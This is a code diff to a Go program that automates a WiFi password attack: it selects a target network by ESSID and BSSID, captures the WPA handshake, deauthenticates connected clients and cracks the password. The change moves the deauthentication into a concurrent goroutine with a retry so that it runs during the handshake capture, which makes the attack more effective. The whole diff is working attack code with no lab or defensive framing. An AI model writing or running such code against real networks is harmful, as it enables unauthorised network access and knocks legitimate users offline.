@@ -55,14 +55,10 @@ func main() {
 	fmt.Printf("\n[+] Targeting network: %s (%s)\n", targetNetwork.ESSID, targetNetwork.BSSID)
 	captureFile := captureHandshake(monitorInterface, targetNetwork)
 
-	// Step 7: Deauth clients
-	fmt.Println("\n[+] Deauthenticating clients...")
-	deauthClients(monitorInterface, targetNetwork.BSSID, 10)
-
-	// Step 8: Stop monitor mode
+	// Step 7: Stop monitor mode
 	stopMonitorMode(monitorInterface)
 
-	// Step 9: Crack password
+	// Step 8: Crack password
 	fmt.Println("\n[+] Attempting to crack password...")
 	crackPassword(captureFile)
 
@@ -405,6 +401,18 @@ func captureHandshake(monitorInterface string, target Network) string {
 		if err := cmd.Run(); err != nil {
 			fmt.Printf("[-] Capture error: %v\n", err)
 		}
+	}()
+
+	// Start concurrent deauth attack
+	go func() {
+		// Wait a moment for airodump to start and switch channel
+		time.Sleep(2 * time.Second)
+		fmt.Println("\n[+] Starting concurrent deauth attack...")
+		// Send deauth packets
+		deauthClients(monitorInterface, target.BSSID, 10)
+		// Maybe retry a few times if needed?
+		time.Sleep(5 * time.Second)
+		deauthClients(monitorInterface, target.BSSID, 10)
 	}()
 
 	// Wait for user to see handshake
